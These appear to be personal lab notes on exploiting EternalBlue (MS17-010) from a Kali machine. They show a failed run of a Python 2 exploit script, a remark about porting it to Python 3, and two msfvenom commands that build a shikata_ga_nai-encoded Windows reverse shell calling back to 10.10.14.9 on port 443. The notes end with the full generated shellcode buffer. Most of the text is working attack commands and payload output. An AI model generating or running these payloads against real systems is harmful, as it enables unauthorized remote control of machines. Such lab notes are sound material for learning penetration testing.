
```sh
┌──(kali㉿proxli)-[~/exploits]
└─$ ./eternalblue.py                    
Traceback (most recent call last):
  File "/home/kali/exploits/./eternalblue.py", line 76, in <module>
    ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde
                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~
TypeError: can't concat str to bytes


┌──(kali㉿proxli)-[~/exploits]
└─$ python2 ./eternalblue.py
Traceback (most recent call last):
  File "./eternalblue.py", line 2, in <module>
    from impacket import smb
ImportError: No module named impacket
```

it's python 2, python 2 is no longer in kali. tried a bit but then did msf


going back and converting script tp python3, we have to test it

```
┌──(exploits)─(kali㉿proxli)-[~/exploits]
└─$ ./eternalblue.py
./eternalblue.py <ip> <shellcode_file> [numGroomConn]

```

we won't actually test it due to time - maybe later:

┌──(kali㉿proxli)-[~/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -e x86/shikata_ga_nai -f exe -o msfv-revsh-10.10.14.9-443.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe file: 73802 bytes
Saved as: msfv-revsh-10.10.14.9-443.exe
                                                                                                               
┌──(kali㉿proxli)-[~/exploits]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=443 -e x86/shikata_ga_nai -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1745 bytes
buf =  b""
buf += b"\xda\xd8\xb8\x74\xda\xb2\x15\xd9\x74\x24\xf4\x5b"
buf += b"\x29\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xb7"
buf += b"\xde\x50\xe0\xcb\x37\x16\x0b\x33\xc8\x77\x85\xd6"
buf += b"\xf9\xb7\xf1\x93\xaa\x07\x71\xf1\x46\xe3\xd7\xe1"
buf += b"\xdd\x81\xff\x06\x55\x2f\x26\x29\x66\x1c\x1a\x28"
buf += b"\xe4\x5f\x4f\x8a\xd5\xaf\x82\xcb\x12\xcd\x6f\x99"
buf += b"\xcb\x99\xc2\x0d\x7f\xd7\xde\xa6\x33\xf9\x66\x5b"
buf += b"\x83\xf8\x47\xca\x9f\xa2\x47\xed\x4c\xdf\xc1\xf5"
buf += b"\x91\xda\x98\x8e\x62\x90\x1a\x46\xbb\x59\xb0\xa7"
buf += b"\x73\xa8\xc8\xe0\xb4\x53\xbf\x18\xc7\xee\xb8\xdf"
buf += b"\xb5\x34\x4c\xfb\x1e\xbe\xf6\x27\x9e\x13\x60\xac"
buf += b"\xac\xd8\xe6\xea\xb0\xdf\x2b\x81\xcd\x54\xca\x45"
buf += b"\x44\x2e\xe9\x41\x0c\xf4\x90\xd0\xe8\x5b\xac\x02"
buf += b"\x53\x03\x08\x49\x7e\x50\x21\x10\x17\x95\x08\xaa"
buf += b"\xe7\xb1\x1b\xd9\xd5\x1e\xb0\x75\x56\xd6\x1e\x82"
buf += b"\x99\xcd\xe7\x1c\x64\xee\x17\x35\xa3\xba\x47\x2d"
buf += b"\x02\xc3\x03\xad\xab\x16\x83\xfd\x03\xc9\x64\xad"
buf += b"\xe3\xb9\x0c\xa7\xeb\xe6\x2d\xc8\x21\x8f\xc4\x33"
buf += b"\xa2\xba\x12\x35\x3b\xd3\x20\x49\x3a\x98\xac\xaf"
buf += b"\x56\xce\xf8\x78\xcf\x77\xa1\xf2\x6e\x77\x7f\x7f"
buf += b"\xb0\xf3\x8c\x80\x7f\xf4\xf9\x92\xe8\xf4\xb7\xc8"
buf += b"\xbf\x0b\x62\x64\x23\x99\xe9\x74\x2a\x82\xa5\x23"
buf += b"\x7b\x74\xbc\xa1\x91\x2f\x16\xd7\x6b\xa9\x51\x53"
buf += b"\xb0\x0a\x5f\x5a\x35\x36\x7b\x4c\x83\xb7\xc7\x38"
buf += b"\x5b\xee\x91\x96\x1d\x58\x50\x40\xf4\x37\x3a\x04"
buf += b"\x81\x7b\xfd\x52\x8e\x51\x8b\xba\x3f\x0c\xca\xc5"
buf += b"\xf0\xd8\xda\xbe\xec\x78\x24\x15\xb5\x89\x6f\x37"
buf += b"\x9c\x01\x36\xa2\x9c\x4f\xc9\x19\xe2\x69\x4a\xab"
buf += b"\x9b\x8d\x52\xde\x9e\xca\xd4\x33\xd3\x43\xb1\x33"
buf += b"\x40\x63\x90"

